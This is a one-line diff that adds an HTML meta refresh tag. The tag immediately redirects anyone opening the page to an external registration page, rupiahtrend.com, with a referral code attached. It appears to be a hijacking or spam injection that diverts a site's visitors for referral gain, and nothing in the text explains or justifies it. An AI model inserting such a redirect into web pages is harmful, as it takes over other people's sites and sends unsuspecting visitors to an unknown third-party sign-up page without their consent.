@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=https://rupiahtrend.com/register?referral_code=k4puyu4k" />
